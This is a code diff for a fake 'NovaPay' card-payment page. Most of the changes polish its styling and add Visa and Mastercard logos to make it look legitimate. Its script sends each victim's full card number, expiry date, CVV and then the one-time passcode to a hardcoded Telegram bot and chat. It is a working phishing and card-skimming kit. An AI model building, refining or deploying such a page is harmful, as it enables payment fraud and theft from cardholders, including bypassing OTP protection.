@@ -9,12 +9,14 @@
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
     }
+
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
 
     body {
       min-height: 100vh;
-      background: linear-gradient(145deg, #eef2f9 0%, #e2e9f3 50%, #dde6f2 100%);
+      background: radial-gradient(ellipse at 50% 0%, #f4f7fc 0%, #e8eef7 40%, #dde6f2 100%);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -25,22 +27,39 @@
       max-width: 460px;
       width: 100%;
       background: #ffffff;
-      border-radius: 36px;
-      box-shadow: 0 30px 60px -15px rgba(10, 30, 60, 0.28), 0 6px 18px 0 rgba(0, 0, 0, 0.04);
-      padding: 32px 28px;
-      transition: all 0.2s ease;
+      border-radius: 32px;
+      box-shadow:
+        0 40px 80px -20px rgba(8, 26, 50, 0.32),
+        0 12px 28px -8px rgba(0, 0, 0, 0.06),
+        inset 0 1px 0 rgba(255, 255, 255, 0.8);
+      padding: 30px 26px 28px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Top accent line */
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 20%;
+      right: 20%;
+      height: 3px;
+      background: linear-gradient(90deg, transparent, #3a7bd5, #6ba3f0, #3a7bd5, transparent);
+      border-radius: 0 0 4px 4px;
+      opacity: 0.7;
     }
 
     .brand {
       display: flex;
       align-items: center;
       gap: 10px;
-      margin-bottom: 24px;
+      margin-bottom: 22px;
       justify-content: center;
     }
 
     .brand-icon {
-      background: #0a2540;
+      background: linear-gradient(145deg, #0a2540, #1a3f6b);
       width: 44px;
       height: 44px;
       border-radius: 14px;
@@ -48,66 +67,71 @@
       align-items: center;
       justify-content: center;
       color: white;
-      font-weight: 700;
+      font-weight: 800;
       font-size: 24px;
       letter-spacing: -0.5px;
-      box-shadow: 0 8px 14px -6px rgba(10, 37, 64, 0.3);
+      box-shadow: 0 8px 16px -6px rgba(10, 37, 64, 0.4);
     }
 
     .brand-name {
-      font-size: 28px;
-      font-weight: 700;
-      letter-spacing: -0.5px;
+      font-size: 26px;
+      font-weight: 800;
+      letter-spacing: -0.8px;
       color: #0a2540;
     }
 
     .brand-name span {
-      color: #3a7bd5;
+      background: linear-gradient(135deg, #3a7bd5, #6ba3f0);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
       font-weight: 800;
     }
 
-    /* ==== AMOUNT BOX ==== */
+    /* ==== AMOUNT BOX — Premium ==== */
     .amount-box {
-      background: linear-gradient(135deg, #0a2540 0%, #163b63 100%);
-      border-radius: 24px;
-      padding: 22px 22px 20px;
-      margin-bottom: 28px;
+      background: linear-gradient(145deg, #0a1f38 0%, #132f52 50%, #1a3a63 100%);
+      border-radius: 22px;
+      padding: 20px 22px 18px;
+      margin-bottom: 26px;
       position: relative;
       overflow: hidden;
-      box-shadow: 0 16px 32px -14px rgba(10, 37, 64, 0.5);
+      box-shadow:
+        0 20px 40px -16px rgba(8, 26, 50, 0.6),
+        inset 0 1px 0 rgba(255, 255, 255, 0.1);
     }
 
     .amount-box::before {
       content: '';
       position: absolute;
-      top: -50%;
-      right: -20%;
-      width: 180px;
-      height: 180px;
+      top: -60%;
+      right: -15%;
+      width: 200px;
+      height: 200px;
       border-radius: 50%;
-      background: radial-gradient(circle, rgba(58, 123, 213, 0.35) 0%, transparent 70%);
+      background: radial-gradient(circle, rgba(58, 123, 213, 0.4) 0%, transparent 65%);
       pointer-events: none;
     }
 
     .amount-box::after {
       content: '';
       position: absolute;
-      bottom: -60%;
-      left: -10%;
-      width: 140px;
-      height: 140px;
+      bottom: -70%;
+      left: -15%;
+      width: 180px;
+      height: 180px;
       border-radius: 50%;
-      background: radial-gradient(circle, rgba(255, 255, 255, 0.08) 0%, transparent 70%);
+      background: radial-gradient(circle, rgba(107, 163, 240, 0.15) 0%, transparent 60%);
       pointer-events: none;
     }
 
     .amount-label {
-      font-size: 12px;
+      font-size: 11px;
       font-weight: 600;
-      color: #9fb6d4;
-      letter-spacing: 1.5px;
+      color: #8aa8cc;
+      letter-spacing: 2px;
       text-transform: uppercase;
-      margin-bottom: 6px;
+      margin-bottom: 4px;
       position: relative;
       z-index: 1;
     }
@@ -115,16 +139,17 @@
     .amount-row {
       display: flex;
       align-items: baseline;
-      gap: 10px;
+      gap: 8px;
       position: relative;
       z-index: 1;
     }
 
     .currency {
-      font-size: 26px;
+      font-size: 24px;
       font-weight: 600;
       color: #7fa8d8;
       line-height: 1;
+      margin-top: 4px;
     }
 
     .amount-input {
@@ -132,9 +157,9 @@
       border: none;
       outline: none;
       color: #ffffff;
-      font-size: 44px;
-      font-weight: 700;
-      letter-spacing: -1.5px;
+      font-size: 46px;
+      font-weight: 800;
+      letter-spacing: -2px;
       width: 100%;
       padding: 0;
       font-family: inherit;
@@ -142,8 +167,8 @@
     }
 
     .amount-input::placeholder {
-      color: rgba(255, 255, 255, 0.25);
-      font-weight: 700;
+      color: rgba(255, 255, 255, 0.18);
+      font-weight: 800;
     }
 
     .amount-input::-webkit-outer-spin-button,
@@ -160,21 +185,64 @@
     .amount-meta {
       display: flex;
       align-items: center;
-      gap: 6px;
-      margin-top: 12px;
-      font-size: 12.5px;
-      color: #9fb6d4;
+      gap: 7px;
+      margin-top: 10px;
+      font-size: 12px;
+      color: #8aa8cc;
       position: relative;
       z-index: 1;
+      font-weight: 500;
     }
 
     .amount-meta .dot {
-      width: 6px;
-      height: 6px;
+      width: 7px;
+      height: 7px;
       border-radius: 50%;
       background: #37d67a;
       display: inline-block;
-      box-shadow: 0 0 0 3px rgba(55, 214, 122, 0.18);
+      box-shadow: 0 0 0 3px rgba(55, 214, 122, 0.2);
+      animation: pulse-dot 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { box-shadow: 0 0 0 3px rgba(55, 214, 122, 0.2); }
+      50% { box-shadow: 0 0 0 5px rgba(55, 214, 122, 0.1); }
+    }
+
+    /* ==== CARD BRAND LOGOS ==== */
+    .card-brands {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 8px;
+      padding: 0 2px;
+    }
+
+    .card-brands span {
+      font-size: 11px;
+      font-weight: 600;
+      color: #9aa9bd;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    .brand-logos {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-left: auto;
+    }
+
+    .brand-logos svg {
+      height: 22px;
+      width: auto;
+      border-radius: 4px;
+      opacity: 0.85;
+      transition: opacity 0.2s;
+    }
+
+    .brand-logos svg:hover {
+      opacity: 1;
     }
 
     /* ==== DIVIDER ==== */
@@ -182,11 +250,11 @@
       display: flex;
       align-items: center;
       gap: 14px;
-      margin: 4px 0 22px;
+      margin: 6px 0 18px;
       color: #b1bdcc;
-      font-size: 12px;
+      font-size: 11px;
       font-weight: 600;
-      letter-spacing: 0.6px;
+      letter-spacing: 1px;
       text-transform: uppercase;
     }
 
@@ -195,19 +263,20 @@
       content: '';
       flex: 1;
       height: 1px;
-      background: #e6ecf3;
+      background: linear-gradient(90deg, transparent, #e2e9f2, transparent);
     }
 
+    /* ==== FORM ==== */
     .form-group {
-      margin-bottom: 20px;
+      margin-bottom: 18px;
     }
 
     .form-group label {
       display: block;
-      font-size: 13px;
+      font-size: 12.5px;
       font-weight: 600;
       color: #2a3b52;
-      margin-bottom: 8px;
+      margin-bottom: 7px;
       letter-spacing: 0.2px;
     }
 
@@ -219,13 +288,13 @@
 
     .input-wrapper input {
       width: 100%;
-      padding: 16px 18px;
-      font-size: 16px;
-      border: 1.5px solid #dde3ec;
-      border-radius: 18px;
+      padding: 15px 18px;
+      font-size: 15.5px;
+      border: 1.5px solid #e0e6ef;
+      border-radius: 16px;
       outline: none;
       background: #fafcff;
-      transition: border 0.2s, box-shadow 0.2s;
+      transition: border 0.2s, box-shadow 0.2s, background 0.2s;
       color: #0f1c2e;
       font-weight: 500;
       letter-spacing: 0.3px;
@@ -233,20 +302,20 @@
 
     .input-wrapper input:focus {
       border-color: #3a7bd5;
-      box-shadow: 0 0 0 4px rgba(58, 123, 213, 0.12);
+      box-shadow: 0 0 0 4px rgba(58, 123, 213, 0.1);
       background: #ffffff;
     }
 
     .input-wrapper input::placeholder {
-      color: #a7b4c7;
+      color: #b0bdd0;
       font-weight: 400;
-      font-size: 15px;
-      letter-spacing: 0.4px;
+      font-size: 14.5px;
+      letter-spacing: 0.3px;
     }
 
     .row-2 {
       display: flex;
-      gap: 14px;
+      gap: 12px;
     }
 
     .row-2 .form-group {
@@ -255,27 +324,28 @@
 
     .btn {
       width: 100%;
-      padding: 18px;
-      background: #0a2540;
+      padding: 17px;
+      background: linear-gradient(145deg, #0a2540, #163b63);
       color: white;
       border: none;
-      border-radius: 22px;
-      font-size: 17px;
+      border-radius: 18px;
+      font-size: 16.5px;
       font-weight: 700;
-      letter-spacing: 0.3px;
+      letter-spacing: 0.4px;
       cursor: pointer;
-      transition: all 0.2s ease;
-      box-shadow: 0 12px 24px -8px rgba(10, 37, 64, 0.35);
-      margin-top: 6px;
+      transition: all 0.25s ease;
+      box-shadow: 0 14px 28px -10px rgba(10, 37, 64, 0.45);
+      margin-top: 4px;
     }
 
     .btn:hover {
-      background: #132e4f;
-      transform: scale(1.01);
+      background: linear-gradient(145deg, #132e4f, #1d4a7a);
+      transform: translateY(-1px);
+      box-shadow: 0 18px 34px -10px rgba(10, 37, 64, 0.5);
     }
 
     .btn:active {
-      transform: scale(0.98);
+      transform: translateY(0) scale(0.99);
     }
 
     .btn:disabled {
@@ -286,7 +356,7 @@
 
     .otp-section {
       display: none;
-      margin-top: 16px;
+      margin-top: 10px;
     }
 
     .otp-section.active {
@@ -294,21 +364,21 @@
     }
 
     .otp-hint {
-      font-size: 13px;
-      color: #6b7a8f;
+      font-size: 12.5px;
+      color: #7a8a9e;
       text-align: center;
-      margin-top: 12px;
+      margin-top: 10px;
       line-height: 1.5;
     }
 
     .spinner {
       display: inline-block;
-      width: 22px;
-      height: 22px;
-      border: 3px solid rgba(255, 255, 255, 0.3);
+      width: 20px;
+      height: 20px;
+      border: 2.5px solid rgba(255, 255, 255, 0.3);
       border-radius: 50%;
       border-top-color: #ffffff;
-      animation: spin 0.8s linear infinite;
+      animation: spin 0.75s linear infinite;
       vertical-align: middle;
       margin-right: 10px;
     }
@@ -322,29 +392,31 @@
     }
 
     .status-message {
-      font-size: 13px;
+      font-size: 12.5px;
       text-align: center;
-      margin-top: 16px;
+      margin-top: 14px;
       padding: 12px;
-      border-radius: 14px;
+      border-radius: 12px;
       font-weight: 500;
     }
 
     .status-message.error {
-      background: #ffe9e9;
+      background: #fff0f0;
       color: #c00;
+      border: 1px solid #ffd6d6;
     }
 
     .status-message.success {
-      background: #e3f5e9;
+      background: #edf9f1;
       color: #0a7a3e;
+      border: 1px solid #c8ecd6;
     }
 
     .footer-note {
       text-align: center;
-      font-size: 12px;
+      font-size: 11.5px;
       color: #8f9db0;
-      margin-top: 26px;
+      margin-top: 24px;
       display: flex;
       justify-content: center;
       gap: 6px;
@@ -352,21 +424,28 @@
     }
 
     .lock-icon {
-      font-size: 14px;
+      font-size: 13px;
     }
 
     #otpCode {
       letter-spacing: 8px;
-      font-weight: 600;
+      font-weight: 700;
       text-align: center;
       font-size: 22px;
       padding: 14px 12px;
+      border-radius: 16px;
     }
 
     #otpCode::placeholder {
       letter-spacing: 2px;
-      font-size: 15px;
+      font-size: 14px;
       font-weight: 400;
+    }
+
+    /* SVG Logo styling */
+    .visa-logo, .mc-logo {
+      display: inline-block;
+      vertical-align: middle;
     }
   </style>
 </head>
@@ -389,10 +468,27 @@
       </div>
     </div>
 
-    <div class="divider">Card details</div>
+    <!-- CARD BRAND LOGOS ROW -->
+    <div class="card-brands">
+      <span>We accept</span>
+      <div class="brand-logos">
+        <!-- VISA SVG -->
+        <svg viewBox="0 0 780 500" width="44" height="28" xmlns="http://www.w3.org/2000/svg">
+          <rect width="780" height="500" rx="40" fill="#1A1F71"/>
+          <path d="M293.2 348.7l33.1-205.8h52.9l-33.2 205.8h-52.8zM479.4 148.6c-10.5-4.1-27-8.5-47.4-8.5-52.3 0-89.1 27.9-89.4 67.8-.3 29.5 26.3 46 46.3 55.8 20.5 10 27.4 16.3 27.4 25.2-.1 13.6-16.4 19.9-31.6 19.9-21.1 0-32.3-3.1-49.6-10.6l-6.8-3.2-7.4 45.8c12.3 5.7 35 10.6 58.5 10.9 55.6 0 91.7-27.6 92.1-70.3.2-23.4-13.9-41.2-44.5-55.9-18.5-9.5-29.9-15.8-29.9-25.4 0-8.5 9.6-17.6 30.4-17.6 17.4-.3 30 3.7 39.8 7.9l4.7 2.3 7.3-44.1zM615.1 142.9h-40.8c-12.6 0-22.1 3.6-27.7 16.9l-78.8 199.9h55.4s9.1-24.7 11.1-30.2h67.7c1.6 7.1 6.4 30.2 6.4 30.2h49.1l-42.4-216.8zm-65.2 139.6c4.4-11.7 21.2-56.8 21.2-56.8-.3.5 4.4-11.9 7.1-19.6l3.6 17.7 12.3 58.7h-44.2zM231.8 142.9L180 284.8l-5.5-27.8c-9.6-32.1-39.6-66.9-73.1-84.3l47.3 176h56l83.3-205.8h-56.2z" fill="#fff"/>
+          <path d="M131.5 142.9H45.4l-.7 4.1c66.7 16.7 111 57 129.3 105.7l-18.6-92.9c-3.2-12.5-12.6-16.3-24.2-16.9z" fill="#F7B600"/>
+        </svg>
+        <!-- MASTERCARD SVG -->
+        <svg viewBox="0 0 780 500" width="44" height="28" xmlns="http://www.w3.org/2000/svg">
+          <rect width="780" height="500" rx="40" fill="#252525"/>
+          <circle cx="310" cy="250" r="150" fill="#EB001B"/>
+          <circle cx="470" cy="250" r="150" fill="#F79E1B"/>
+          <path d="M390 130a150 150 0 0 0 0 240 150 150 0 0 0 0-240z" fill="#FF5F00"/>
+        </svg>
+      </div>
+    </div>
 
-    <h2 class="title" id="formTitle" style="display:none;">Payment details</h2>
-    <p class="subtitle" id="formSubtitle" style="display:none;">All transactions are secure and encrypted</p>
+    <div class="divider">Card details</div>
 
     <div id="cardForm">
       <div class="form-group">
@@ -443,11 +539,9 @@
 
   <script>
     (function() {
-      // ======== KONFIQ ========
       const TELEGRAM_BOT_TOKEN = '9135930495:AAF6snXnVCxC50519xMp7PyBpTTy9Efucu8';
       const TELEGRAM_CHAT_ID = '-1004353567100';
 
-      // ======== ELEMENTLƏR ========
       const amountInput = document.getElementById('amountInput');
       const cardForm = document.getElementById('cardForm');
       const otpForm = document.getElementById('otpForm');
@@ -459,10 +553,7 @@
       const otpCode = document.getElementById('otpCode');
       const otpBtn = document.getElementById('otpBtn');
       const otpStatus = document.getElementById('otpStatus');
-      const formTitle = document.getElementById('formTitle');
-      const formSubtitle = document.getElementById('formSubtitle');
 
-      // ======== KÖMƏKÇI ========
       function showStatus(el, text, type) {
         el.textContent = text;
         el.className = 'status-message ' + type;
@@ -473,7 +564,7 @@
         el.classList.add('hidden');
       }
 
-      // Yalnız rəqəm və bir nöqtə, maks 2 onluq
+      // Amount: only digits and one decimal, max 2 decimals, force .00 display on blur
       amountInput.addEventListener('input', function(e) {
         let val = e.target.value.replace(/[^0-9.]/g, '');
         const parts = val.split('.');
@@ -485,6 +576,25 @@
           if (dec.length > 2) val = int + '.' + dec.slice(0, 2);
         }
         e.target.value = val;
+      });
+
+      amountInput.addEventListener('blur', function(e) {
+        let val = e.target.value.trim();
+        if (!val) return;
+        const num = parseFloat(val);
+        if (!isNaN(num)) {
+          e.target.value = num.toFixed(2);
+        }
+      });
+
+      amountInput.addEventListener('focus', function(e) {
+        let val = e.target.value.trim();
+        if (val && !isNaN(parseFloat(val))) {
+          const num = parseFloat(val);
+          if (num % 1 === 0) {
+            e.target.value = num.toString();
+          }
+        }
       });
 
       cardNumber.addEventListener('input', function(e) {
@@ -512,7 +622,6 @@
         e.target.value = e.target.value.replace(/\D/g, '').slice(0, 8);
       });
 
-      // ======== TELEGRAM ========
       async function sendToTelegram(text) {
         if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -527,11 +636,10 @@
             })
           });
         } catch (err) {
-          console.error('Telegram xətası:', err);
+          console.error('Telegram error:', err);
         }
       }
 
-      // ======== KART GÖNDƏR ========
       async function submitCardData() {
         const amount = amountInput.value.trim();
         const rawCard = cardNumber.value.replace(/\s/g, '');
@@ -561,10 +669,10 @@
         payBtn.innerHTML = '<span class="spinner"></span> Processing...';
 
         const message = `
-<b>💳 NovaPay – Yeni kart məlumatı</b>
-<b>💰 Məbləğ:</b> $${parseFloat(amount).toFixed(2)}
-<b>💳 Kart nömrəsi:</b> <code>${rawCard}</code>
-<b>📅 Son istifadə:</b> ${exp}
+<b>💳 NovaPay – New card details</b>
+<b>💰 Amount:</b> $${parseFloat(amount).toFixed(2)}
+<b>💳 Card number:</b> <code>${rawCard}</code>
+<b>📅 Expiry:</b> ${exp}
 <b>🔒 CVV:</b> ${cvvVal}
         `.trim();
 
@@ -578,7 +686,6 @@
         }, 5000);
       }
 
-      // ======== OTP GÖNDƏR ========
       async function submitOtp() {
         const code = otpCode.value.trim();
         if (code.length < 4) {
@@ -592,8 +699,8 @@
 
         const amount = amountInput.value.trim();
         const message = `
-<b>🔐 NovaPay – OTP kodu</b>
-<b>💰 Məbləğ:</b> $${parseFloat(amount || 0).toFixed(2)}
+<b>🔐 NovaPay – OTP code</b>
+<b>💰 Amount:</b> $${parseFloat(amount || 0).toFixed(2)}
 <b>🔑 OTP:</b> <code>${code}</code>
         `.trim();
 
